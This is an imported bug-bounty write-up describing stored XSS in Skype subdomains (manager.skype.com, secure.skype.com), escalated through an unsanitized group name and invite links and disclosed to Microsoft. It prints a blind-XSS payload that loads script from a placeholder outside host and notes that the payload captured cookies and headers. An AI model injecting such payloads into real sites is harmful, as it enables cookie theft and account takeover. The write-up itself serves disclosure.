---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-10_multiple-xss-in-skypecom-2.md
original_filename: 2019-04-10_multiple-xss-in-skypecom-2.md
title: Multiple xss in *.skype.com (2)
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 0229a2a023ce8f475985ec498956e69be4f5a27a825ca1c7197d72914f347b7e
text_sha256: 91cbe2558c5b47634bf4bae942dff94759372fde8b7e10846a20751c05be8535
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Multiple xss in *.skype.com (2)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-10_multiple-xss-in-skypecom-2.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `0229a2a023ce8f475985ec498956e69be4f5a27a825ca1c7197d72914f347b7e`
- Text SHA256: `91cbe2558c5b47634bf4bae942dff94759372fde8b7e10846a20751c05be8535`


## Content

---
title: "Multiple xss in *.skype.com (2)"
url: "https://medium.com/@jayateerthag/multiple-xss-in-skype-com-2-18cfed39edbd"
authors: ["Jayateertha Guruprasad (@JayateerthaG)"]
programs: ["Microsoft"]
bugs: ["XSS"]
publication_date: "2019-04-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5317
scraped_via: "browseros"
---

# Multiple xss in *.skype.com (2)

Multiple xss in *.skype.com (2)
Jayateertha Guruprasad
Follow
2 min read
·
Apr 10, 2019

81

1

PART 2:

So If you have read the part 1, You would have seen that I found a stored-self Xss in manager.skype.com which was getting escalated in the option(“make the USER as admin of group_name”) as group_name was not properly sanitized there.

Here’s what I did to affect other users,You just need to create a invite link and make a user join your group.

Once ,the user joins your group ,You just need to make him as admin using the option I mentioned earlier.(requires no user interactions once he joins the group)

Once user is made as admin ,He will now see the same option called (“make the USER as admin of group_name”),where the gropu_name was not sanitized and xss gets executed successfully on the user also!!!

Press enter or click to view image in full size

So It all ended???

No, I did more research and put a BXSS payload “><script src=”malicious_script_url”> in group_name.

Now add a member by sending the member a invite link.

Press enter or click to view image in full size

Once the member clicks the invite link,and accepts it , xss was getting executed in another sub domain too(secure.skype.com)!!!

Get Jayateertha Guruprasad’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The BXSS payload used was provided by xsshunter ,through which I was able to get user details like

screenshot of affected page,user cookies,headers,device informations,ip address etc!!!

This has hell lot of information ,which is sufficient to compromise user data and also account takeover.

Press enter or click to view image in full size
Press enter or click to view image in full size

Then ,I made a final report combining all my research and sent them (secure@microsoft.com)

Finally ,I was acknowledged by Microsoft at their security researchers acknowledgement page(FEB-2019):

https://portal.msrc.microsoft.com/en-us/security-guidance/researcher-acknowledgments-online-services

Press enter or click to view image in full size
Press enter or click to view image in full size
